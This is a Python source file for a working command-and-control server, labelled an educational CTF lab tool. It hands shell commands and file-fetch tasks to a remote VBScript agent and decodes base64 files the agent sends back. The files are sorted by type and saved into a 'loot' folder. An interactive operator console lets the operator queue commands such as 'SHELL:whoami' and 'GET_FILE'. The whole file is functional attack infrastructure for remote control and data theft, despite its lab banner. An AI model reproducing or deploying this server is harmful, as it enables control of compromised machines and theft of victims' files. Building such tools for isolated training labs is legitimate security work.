#!/usr/bin/env python3
"""
Enhanced CTF Lab C2 Server - Educational Use Only
Features:
- Interactive operator console
- Expanded file type detection
- Task persistence
- Better logging and error handling

Usage: python3 server.py
"""

import base64
import datetime
import os
import time
import threading
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- Configuration for Isolated Lab Use ---
C2_PORT = 8080
C2_HOST = "0.0.0.0"
LOOT_DIR = "loot"
TASK_FILE = "task_queue.json"
COMMAND_QUEUE = []

# Ensure directories exist
os.makedirs(LOOT_DIR, exist_ok=True)

# --- Safety Banner ---
print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] ⚠️  C2 SIMULATION INITIALIZING")
print("=" * 60)
print("⚠️  WARNING: Educational Use Only - Isolated Lab Environment")
print("=" * 60)
print(f"Configuration:")
print(f"  • Listening: {C2_HOST}:{C2_PORT}")
print(f"  • Loot Directory: {LOOT_DIR}/")
print(f"  • Task Persistence: {TASK_FILE}")
print("-" * 60)


class Handler(BaseHTTPRequestHandler):
    """Handles HTTP requests from VBScript agent and C2 operator."""

    def log_message(self, format, *args):
        """Suppress default HTTP logging."""
        pass

    def do_GET(self):
        """Handle GET requests for /task and /queue endpoints."""
        global COMMAND_QUEUE
        path = self.path.split('?')[0]

        # Agent requests next task
        if path == "/task":
            print(f"[{time.strftime('%H:%M:%S')}] [📥] Task REQUEST from {self.client_address[0]}")

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.end_headers()

            if COMMAND_QUEUE:
                task = COMMAND_QUEUE.pop(0)
                save_queue()
                remaining = len(COMMAND_QUEUE)
                print(
                    f"[{time.strftime('%H:%M:%S')}] [→] Task sent to {self.client_address[0]}: {task.get('task', 'sleep')} (Remaining: {remaining})")
            else:
                task = {"task": "sleep"}
                print(f"[{time.strftime('%H:%M:%S')}] [→] SLEEP sent to {self.client_address[0]} (queue empty)")

            self.wfile.write(json.dumps(task).encode())
            return

        # Operator requests queue status
        if path == "/queue":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()

            output = json.dumps({
                "queue": COMMAND_QUEUE,
                "total_tasks": len(COMMAND_QUEUE)
            }, indent=2)
            print(f"[{time.strftime('%H:%M:%S')}] [📋] Queue status requested ({len(COMMAND_QUEUE)} tasks)")

            self.wfile.write(output.encode())
            return

        self.send_error(404)

    def do_POST(self):
        """Handle POST requests for /report and /enqueue endpoints."""
        global COMMAND_QUEUE

        length = int(self.headers["Content-Length"])
        body = self.rfile.read(length).decode("utf-8", errors="ignore")
        ip = self.client_address[0]
        ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        # Agent reports command results
        if self.path == "/report":
            print(f"[{time.strftime('%H:%M:%S')}] [+] REPORT from {ip} (len={len(body)})")

            # Always log raw report
            with open("agent_reports.txt", "a", encoding="utf-8") as f:
                f.write(f"[{ts}] FROM {ip}\n{body}\n{'-' * 60}\n")

            # Try to decode as exfiltrated file
            saved = self.try_save_base64(body, ts, ip)

            if saved:
                print(f"[{time.strftime('%H:%M:%S')}] [💾] File saved: {saved}")
            elif "UPLOAD_ERROR" in body or "File not found" in body:
                print(f"[{time.strftime('%H:%M:%S')}] [❌] Upload error: {body[:100]}...")
            else:
                print(f"[{time.strftime('%H:%M:%S')}] [📝] Report logged (shell output)")

            self.send_response(200)
            self.end_headers()
            return

        # Operator adds task to queue
        if self.path == "/enqueue":
            task_cmd = body.strip()
            print(f"[{time.strftime('%H:%M:%S')}] [Operator] Task enqueued: {task_cmd}")
            COMMAND_QUEUE.append({"task": task_cmd})
            save_queue()  # Persist after adding
            print(f"[{time.strftime('%H:%M:%S')}] [📋] Queue now has {len(COMMAND_QUEUE)} tasks")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        self.send_error(404)

    def try_save_base64(self, data, timestamp, ip):
        """
        Enhanced Base64 decoder with expanded file type detection.
        Returns saved file path or None.
        """
        data = data.strip()
        cleaned = "".join(data.split())

        if len(cleaned) < 100:
            return None

        try:
            decoded = base64.b64decode(cleaned)
        except Exception:
            return None

        # Enhanced magic byte detection
        magic = decoded[:16]

        # Images
        if magic.startswith(b'\xff\xd8\xff'):
            ext = "jpg"
        elif magic.startswith(b'\x89PNG\r\n\x1a\n'):
            ext = "png"
        elif magic.startswith(b'GIF87a') or magic.startswith(b'GIF89a'):
            ext = "gif"
        elif magic.startswith(b'BM'):
            ext = "bmp"

        # Documents
        elif magic.startswith(b'%PDF-'):
            ext = "pdf"
        elif magic.startswith(b'PK\x03\x04'):
            # Office formats (ZIP-based)
            preview = decoded[:2000]
            if b'word/' in preview:
                ext = "docx"
            elif b'xl/' in preview:
                ext = "xlsx"
            elif b'ppt/' in preview:
                ext = "pptx"
            else:
                ext = "zip"

        # Text formats
        elif all(32 <= b < 127 or b in [9, 10, 13] for b in decoded[:100]):
            text_preview = decoded[:500].decode('utf-8', errors='ignore').lower()
            if text_preview.startswith('<?xml'):
                ext = "xml"
            elif text_preview.startswith('{') or text_preview.startswith('['):
                ext = "json"
            elif 'flag{' in text_preview or 'ctf{' in text_preview:
                ext = "txt.flag"
            else:
                ext = "txt"

        # Executables
        elif magic.startswith(b'MZ'):
            ext = "exe"
        elif magic.startswith(b'\x7fELF'):
            ext = "elf"

        # Archives
        elif magic.startswith(b'Rar!\x1a\x07'):
            ext = "rar"
        elif magic.startswith(b'\x1f\x8b'):
            ext = "gz"

        # Database
        elif magic.startswith(b'SQLite format 3'):
            ext = "db"

        else:
            ext = "bin"

        filename = f"{ip}_{timestamp}.{ext}"
        path = os.path.join(LOOT_DIR, filename)

        with open(path, "wb") as f:
            f.write(decoded)

        size_kb = len(decoded) / 1024
        print(f"    └─> Decoded {size_kb:.2f} KB as .{ext}")

        return path


# --- Task Persistence Functions ---
def save_queue():
    """Save current task queue to disk."""
    try:
        with open(TASK_FILE, "w") as f:
            json.dump(COMMAND_QUEUE, f, indent=2)
    except Exception as e:
        print(f"[!] Failed to save queue: {e}")


def load_queue():
    """Load task queue from disk if exists."""
    global COMMAND_QUEUE
    if os.path.exists(TASK_FILE):
        try:
            with open(TASK_FILE, "r") as f:
                COMMAND_QUEUE = json.load(f)
            print(f"[*] Loaded {len(COMMAND_QUEUE)} tasks from {TASK_FILE}")
        except Exception as e:
            print(f"[!] Failed to load queue: {e}")


def add_task(cmd):
    """Add a task to the queue programmatically."""
    COMMAND_QUEUE.append({"task": cmd})
    save_queue()


# --- Operator Console (Interactive CLI) ---
def operator_console():
    """
    Interactive console for C2 operator.
    Runs in separate thread alongside HTTP server.
    """
    print("\n" + "=" * 60)
    print("🎯 C2 OPERATOR CONSOLE")
    print("=" * 60)
    print("Commands:")
    print("  queue                 - Show current task queue")
    print("  add <TASK>            - Add task (e.g., 'add SHELL:whoami')")
    print("  clear                 - Clear all queued tasks")
    print("  loot                  - List exfiltrated files")
    print("  reports               - Show recent agent reports")
    print("  exit                  - Shutdown C2 server")
    print("=" * 60 + "\n")

    while True:
        try:
            cmd = input("C2> ").strip()

            if not cmd:
                continue

            if cmd.lower() == "exit":
                print("[*] Shutting down server...")
                os._exit(0)

            elif cmd.lower() == "queue":
                if COMMAND_QUEUE:
                    print(f"\n[📋 Queue] {len(COMMAND_QUEUE)} tasks pending:")
                    for i, task in enumerate(COMMAND_QUEUE, 1):
                        print(f"  {i}. {task['task']}")
                else:
                    print("[📋 Queue] Empty (agents will receive SLEEP)")
                print()

            elif cmd.lower() == "clear":
                count = len(COMMAND_QUEUE)
                COMMAND_QUEUE.clear()
                save_queue()
                print(f"[*] Cleared {count} tasks\n")

            elif cmd.lower() == "loot":
                files = os.listdir(LOOT_DIR)
                if files:
                    print(f"\n[💾 Loot] {len(files)} files:")
                    for f in sorted(files):
                        size = os.path.getsize(os.path.join(LOOT_DIR, f))
                        print(f"  - {f} ({size / 1024:.2f} KB)")
                else:
                    print("[💾 Loot] No files yet")
                print()

            elif cmd.lower() == "reports":
                if os.path.exists("agent_reports.txt"):
                    with open("agent_reports.txt", "r") as f:
                        lines = f.readlines()
                    print(f"\n[📝 Reports] Last 20 lines:")
                    print("".join(lines[-20:]))
                else:
                    print("[📝 Reports] No reports file yet\n")

            elif cmd.lower().startswith("add "):
                task_cmd = cmd[4:].strip()
                if task_cmd:
                    COMMAND_QUEUE.append({"task": task_cmd})
                    save_queue()
                    print(f"[+] Task added: {task_cmd}")
                    print(f"[📋 Queue] Now has {len(COMMAND_QUEUE)} tasks\n")
                else:
                    print("[!] Usage: add <TASK>\n")
                    print("Examples:")
                    print("  add SHELL:whoami")
                    print("  add GET_FILE:C:\\ctf\\flag.txt\n")

            else:
                print("[!] Unknown command\n")

        except EOFError:
            break
        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to shutdown\n")
        except Exception as e:
            print(f"[!] Console error: {e}\n")


# --- Main Entry Point ---
if __name__ == "__main__":
    # Load persisted tasks
    load_queue()

    # Add example initial tasks if queue is empty
    if not COMMAND_QUEUE:
        add_task("SHELL:whoami")
        add_task("SHELL:ipconfig")
        print(f"[*] Added {len(COMMAND_QUEUE)} example tasks")

    print(f"\n[*] C2 Server starting on http://0.0.0.0:{C2_PORT}")
    print(f"[*] Initial queue size: {len(COMMAND_QUEUE)}")
    print("[*] Tasks are REMOVED after agent retrieval")
    print("-" * 60)
    print("Endpoints:")
    print("  GET  /task     - Agent retrieves next task")
    print("  POST /report   - Agent submits results")
    print("  POST /enqueue  - Operator adds task")
    print("  GET  /queue    - View queue status")
    print("-" * 60)

    # Start interactive operator console in background thread
    console_thread = threading.Thread(target=operator_console, daemon=True)
    console_thread.start()

    # Start HTTP server
    server = HTTPServer((C2_HOST, C2_PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down C2 server.")
        server.server_close()